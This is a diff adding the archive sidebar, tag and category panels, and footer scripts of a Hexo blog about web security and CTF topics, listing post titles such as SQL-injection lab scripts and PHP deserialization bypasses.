+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/2019/06/13/Sqli-labs 盲注脚本编写/" >Sqli-labs 盲注脚本编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/2019/05/21/Beautifulsoup解析/" >BeautifulSoup解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/代码审计的相关函数分析/" >代码审计相关函数分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href= "/2019/05/13/bugku代码审计wp/" >bugku代码审计wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2019/04/21/PHP反序列化绕过__wakeup方法/" >PHP反序列化绕过__wakeup方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span><a class="archive-post-title" href= "/2019/03/31/文件包含漏洞/" >文件包含漏洞小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2019/02/03/同一台电脑连接多个github仓库/" >同一台电脑连接多个github仓库</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2019/02/03/hgame草稿/" >hgame-web-week1</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="编程"><span class="iconfont-archer">&#xe606;</span>编程</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="编程"><span class="iconfont-archer">&#xe60a;</span>编程</span>
+    
+        <span class="sidebar-category-name" data-categories="web"><span class="iconfont-archer">&#xe60a;</span>web</span>
+    
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
+    
+        <span class="sidebar-category-name" data-categories="��ʽ����"><span class="iconfont-archer">&#xe60a;</span>��ʽ����</span>
+    
+        <span class="sidebar-category-name" data-categories="����С����"><span class="iconfont-archer">&#xe60a;</span>����С����</span>
+    
+        <span class="sidebar-category-name" data-categories="正式文章"><span class="iconfont-archer">&#xe60a;</span>正式文章</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Kage"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+     
+    </body>
+</html>
+
+
